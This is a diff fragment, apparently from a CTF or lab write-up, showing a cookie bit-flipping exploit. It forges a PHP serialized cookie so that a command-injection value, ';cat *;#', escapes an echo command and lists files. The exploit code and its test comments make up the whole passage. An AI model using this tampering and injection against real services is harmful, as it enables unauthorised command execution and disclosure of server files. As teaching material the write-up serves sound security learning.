+#a:2:{s:4:&quot;name&quot;;s:42:&quot;zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz&quot;;s:8:&quot;greeting&quot;;s:56:&quot;echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'&quot;;}
+#a:2:{s:4:&quot;name&quot;;
+#s:42:&quot;zzzzzzzzzz
+#zzzzzzzX;cat *;#
+#zzzzzzzzzzzzzzzz
+#&quot;;s:8:&quot;greeting&quot;
+#;s:56:&quot;echo 'Hel
+#lo zzzzzzzzzzzzz
+#zzzzX;cat *;#zzz
+#zzzzzzzzzzzzz!'&quot;
+#;}
+#exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
+exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success
  
-<span class="c">#exploit = &quot;______________________________________________________; cat *;#&quot;</span>
-<span class="c">#Test(exploit)</span>
-<span class="n">cookie</span> <span class="o">=</span> <span class="n">GetCookie</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-<span class="n">pos</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> <span class="c">#test case success</span>
-<span class="c">#pos = 51; #test case first, unsuccess</span>
-<span class="n">val</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">&#39;X&#39;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="n">pos</span><span class="p">]))</span>
-<span class="n">exploit</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">[</span><span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
-<span class="n">Pwn</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span></code></pre></div>
+#exploit = &quot;______________________________________________________; cat *;#&quot;
+#Test(exploit)
+cookie = GetCookie(exploit)
+pos = 100; #test case success
+#pos = 51; #test case first, unsuccess
+val = chr(ord('X') ^ ord(&quot;'&quot;) ^ ord(cookie[pos]))
+exploit = cookie[0:pos] + val + cookie[pos + 1:]
+Pwn(exploit)</code></pre>
+</div>
 
